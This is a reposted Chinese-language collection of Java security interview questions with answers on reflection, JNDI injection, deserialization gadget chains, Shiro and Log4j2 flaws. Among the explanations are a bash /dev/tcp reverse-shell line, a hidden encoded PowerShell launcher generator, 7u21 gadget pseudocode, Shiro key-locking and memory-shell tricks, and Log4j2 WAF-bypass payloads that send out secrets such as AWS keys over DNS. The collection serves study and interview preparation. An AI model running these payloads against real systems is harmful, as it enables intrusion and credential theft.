本文转载自：[Java安全研究与安全开发面试题总结](https://github.com/cdhe/JavaSecInterview)

最低难度★   最高难度★★★★★

## JDK

- Java反射做了什么事情（★）

反射是根据字节码获得类信息或调用方法。从开发者角度来讲，反射最大的意义是提高程序的灵活性。Java本身是静态语言，但反射特性允许运行时动态修改类定义和属性等，达到了静态的效果

- Java反射可以修改Final字段嘛（★★）

可以做到，参考以下代码

```java
field.setAccessible(true);
Field modifiersField = Field.class.getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
field.set(null, newValue);
```

- 传统的反射方法加入黑名单怎么绕（★★★）

可以使用的类和方法如下（参考三梦师傅）

```java
ReflectUtil.forName
BytecodeDescriptor
ClassLoader.loadClass
sun.reflect.misc.MethodUtil
sun.reflect.misc.FieldUtil
sun.reflect.misc.ConstructorUtil
MethodAccessor.invoke
JSClassLoader.invoke
JSClassLoader.newInstance
```

- Java中可以执行反弹shell的命令吗（★★）

可以执行，但需要对命令进行特殊处理。例如直接执行这样的命令：`bash -i >& /dev/tcp/ip/port 0>&1`会失败，简单来说因为`>`符号是重定向，如果命令中包含输入输出重定向和管道符，只有在`bash`下才可以，使用Java执行这样的命令会失败，所以需要加入`Base64`

```shell
bash -c {echo,base64的payload}|{base64,-d}|{bash,-i}
```

针对`Powershell`应该使用以下的命令

```shell
powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc 特殊的Base64
```

这个特殊的Base64和普通Base64不同，需要填充0，算法如下

```java
public static String getPowershellCommand(String cmd) {
    char[] chars = cmd.toCharArray();
    List<Byte> temp = new ArrayList<>();
    for (char c : chars) {
        byte[] code = String.valueOf(c).getBytes(StandardCharsets.UTF_8);
        for (byte b : code) {
            temp.add(b);
        }
        temp.add((byte) 0);
    }
    byte[] result = new byte[temp.size()];
    for (int i = 0; i < temp.size(); i++) {
        result[i] = temp.get(i);
    }
    String data = Base64.getEncoder().encodeToString(result);
    String prefix = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ";
    return prefix + data;
}
```

- 假设`Runtime.exec`加入黑名单还有什么方式执行命令（★★）

其实这个问题有点类似`JSP Webshell`免杀

大致方法有这些：使用基本的反射，ProcessImpl和ProcessBuilde，JDNI和LDAP注入，TemplatesImpl，BCEL，BeansExpression，自定义ClassLoader，动态编译加载，ScriptEngine，反射调用一些native方法，各种EL（SPEL和Tomcat EL等）

- RMI和LDAP类型的JNDI注入分别在哪个版本限制（★）

RMI的JNDI注入在8u121后限制，需要手动开启`com.sun.jndi.rmi.object.trustURLCodebase`属性

LDAP的JNDI注入在8u191后限制，需要开启`com.sun.jndi.ldap.object.trustURLCodebase`属性

- RMI和LDAP的限制版本分别可以怎样绕过（★★）

RMI的限制是限制了远程的工厂类而不限制本地，所以用本地工厂类触发

通过`org.apache.naming.factory.BeanFactory`结合`ELProcessor`绕过

LDAP的限制中不对`javaSerializedData`验证，所以可以打本地`gadget`

- 谈谈TemplatesImpl这个类（★★）

这个类本身是JDK中XML相关的类，但被很多`Gadget`拿来用

一般情况下加载字节码都需要使用到ClassLoader来做，其中最核心的`defineClass`方法只能通过反射来调用，所以实战可能比较局限。但JDK中有一个`TemplatesImpl`类，其中包含`TransletClassLoader`子类重写了`defineClass`所以允许`TemplatesImpl`类本身调用。`TemplatesImpl`其中有一个特殊字段`_bytecodes`是一个二维字节数组，是被加载的字节码

通过`newTransformer`可以达到`defineClass`方法加载字节码。而`getOutputProperties`方法（getter）中调用了`newTransformer`方法，也是一个利用链

```text
TemplatesImpl.getOutputProperties()
	TemplatesImpl.newTransformer()
	TemplatesImpl.getTransletInstance()
	TemplatesImpl.defineTransletClasses()
	ClassLoader.defineClass()
	Class.newInstance()
```

- 了解BCEL ClassLoader吗（★）

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目

该类常常用于各种漏洞利用POC的构造，可以加载特殊的字符串所表示的字节码

但是在Java 8u251之后该类从JDK中移除

- 谈谈7U21反序列化（★★★★★）

从`LinkedHashSet.readObject`开始，找到父类`HashSet.readObject`方法，其中包含`HashMap`的类型转换以及`HashMap.put`方法，跟入`HashMap.put`其中对`key`与已有`key`进行`equals`判断，这个`equals`方法是触发后续利用链的关键。但`equals`方法的前置条件必须满足

```java
if (e.hash == hash && ((k = e.key) == key || key.equals(k)))
```

所以这里需要用哈希碰撞，让下一个`key`的哈希值和前一个相等，才可进入第二个条件。而第二个条件中必须让前一个条件失败才可以进去`equals`方法，两个`key`对象不相同是显而易见的

接下来的任务是找到一处能触发`equals`方法的地方

反射创建`AnnotationInvocationHandler`对象，传入`Templates`类型和`HashMap`参数。再反射创建被该对象代理的新对象，根据动态代理技术，代理对象方法调用需要经过`InvocationHandler.invoke`方法，在`AnnotationInvocationHandler`这个`InvocationHandler`的`invoke`方法实现中如果遇到`equals`方法，会进入`equalsImpl`方法，其中遍历了`equals`方法传入的参数`TemplatesImpl`的所有方法并反射调用，通过`getOutputProperties`方法最终加载字节码导致RCE

关于7U21的伪代码如下

```java
Object templates = Gadgets.createTemplatesImpl();
String zeroHashCodeStr = "f5a5a608";
HashMap map = new HashMap();
Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
ctor.setAccessible(true);
InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);
LinkedHashSet set = new LinkedHashSet();
set.add(templates);
set.add(proxy);
map.put(zeroHashCodeStr, templates);
return set;
```

结合调用链

```text
LinkedHashSet.readObject()
  LinkedHashSet.add()/HashMap.put()
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
```

可以看到伪代码最后在`map`中`put`了某个元素，这是为了处理哈希碰撞的问题。`TemplatesImpl`没有重写`hashcode`直接调用`Object`的方法。而代理对象的`hashcode`方法也是会先进入`invoke`方法的，跟入`hashCodeImpl`方法看到是根据传入参数`HashMap`来做的，累加每一个`Entry`的`key`和`value`计算得出的`hashcode`。通过一些运算，可以找到符合条件的碰撞值

- 谈谈8U20反序列化（★★★★★）

这是7U21修复的绕过（作者对该问题了解较浅，面试没有被问到过）

在`AnnotationInvocationHandler`反序列化调用`readObject`方法中，对当前`type`进行了判断。之前POC中的`Templates`类型会导致抛出异常无法继续。使用`BeanContextSupport`绕过，在它的`readObject`方法中调用`readChildren`方法，其中有`try-catch`但没有抛出异常而是`continue`继续

所以这种情况下，就算之前的反序列化过程中出错，也会继续进行下去。但想要控制这种情况，不可以用正常序列化数据，需要自行构造畸形的序列化数据

- 了解缩小反序列化Payload的手段吗（★★★）

首先最容易的方案是使用Javassist生成字节码，这种情况下生成的字节码较小。进一步可以用ASM删除所有的LineNumber指令，可以更小一步。最终手段可以分块发送多个Payload最后合并再用URLClassLoader加载

- 待师傅们补充

## Shiro

- Shiro反序列化怎么检测key（★★★）

实例化一个`SimplePrincipalCollection`遍历key列表进行AES加密，然后加入到`Cookie`的`rememberMe`字段中发送，如果响应头的`Set-Cookie`字段包含`rememberMe=deleteMe`说明不是该密钥，如果什么都不返回，说明当前key是正确的key。实际中可能需要多次这样的请求来确认key

- Shiro 721怎么利用（★★）

需要用到Padding Oracle Attack技术，限制条件是需要已知合法用户的`rememberMe`且需要爆破较长的时间

- 最新版Shiro还存在反序列化漏洞吗（★）

存在，如果密钥是常见的，还是有反序列化漏洞的可能性

- Shiro反序列化Gadget选择有什么坑吗（★★★）

默认不包含CC链包含CB1链。用不同版本的CB1会导致出错，因为`serialVersionUID` 不一致

另一个CB1的坑是`Comparator`来自于CC，需要使用如下的

```java
BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
```

- Shiro注Tomcat内存马有什么坑吗（★★★★）

Shiro注内存马时候由于反序列化Payload过大会导致请求头过大报错

解决办法有两种：第一种是反射修改Tomcat配置里的请求头限制熟悉，但这个不靠谱，不同版本`Tomcat`可能修改方式不一致。另外一种更为通用的手段是打过去一个`Loader`的`Payload`加载请求`Body`里的字节码，将内存马字节码写入请求`Body`中。这种方式的缺点是依赖当前请求对象，更进一步可以写文件`URLClassLoader`加载

- 有什么办法让Shiro洞只能被你一人发现（★★）

发现Shiro洞后，改了其中的key为非通用key。通过已经存在的反序列化可以执行代码，反射改了`RememberMeManager`中的key即可。但这样会导致已登录用户失效，新用户不影响

- Shiro的权限绕过问题了解吗（★★）

主要是和Spring配合时候的问题，例如`/;/test/admin/page`问题，在`Tomcat`判断`/;test/admin/page` 为test应用下的`/admin/page`路由，进入到Shiro时被`;`截断被认作为`/`,再进入Spring时又被正确处理为test应用下的`/admin/page`路由，最后导致shiro的权限绕过。后一个修复绕过，是针对动态路由如`/admin/{name}`

## Log4j2

- 谈谈Log4j2漏洞（★★）

漏洞原理其实不难，简单来说就是对于`${jndi:}`格式的日志默认执行`JndiLoop.loojup`导致的RCE。有几处关键问题，首先日志的任何一部分插入`${}`都会进行递归处理，也就是说`log.info/error/warn`等方法如果日志内容可控，就会导致这个问题。这个漏洞本身不复杂，后续的一个绕过比较有趣

- 知道Log4j2 2.15.0 RC1修复的绕过吗（★★★）

修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常然后RCE

- Log4j2的两个DOS CVE了解吗（★★）

其中一个DOS是`lookup`本身延迟等待和允许多个标签`${}`导致的问题

另一个DOS是嵌套标签`${}`导致栈溢出

- Log4j2 2.15.0正式版的绕过了解吗（★★★）

正式版的修复只是在之前基础上捕获了异常。这个绕过本质还是绕HOST限制。使用`127.0.0.1#evil.com`即可绕过，需要服务端配置泛域名，所以#前的127.0.0.1会被认为是某个子域名，而本地解析认为这是127.0.0.1绕过了HOST的限制。但该RCE仅可以在MAC OS和部分Linux平台成功

- Log4j2绕WAF的手段有哪些（★★）

使用类似`${::-J}`的方式做字符串的绕过，还可以结合`upper`和`lower`标签进行嵌套

有一些特殊字符的情况结合大小写转换有巧妙的效果，还可以加入垃圾字符

例如：`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`

- Log4j2除了RCE还有什么利用姿势（★★★）

利用其他的`lookup`可以做信息泄露例如`${env:USER}`和`${env:AWS_SECRET_ACCESS_KEY}`

在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息

这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`
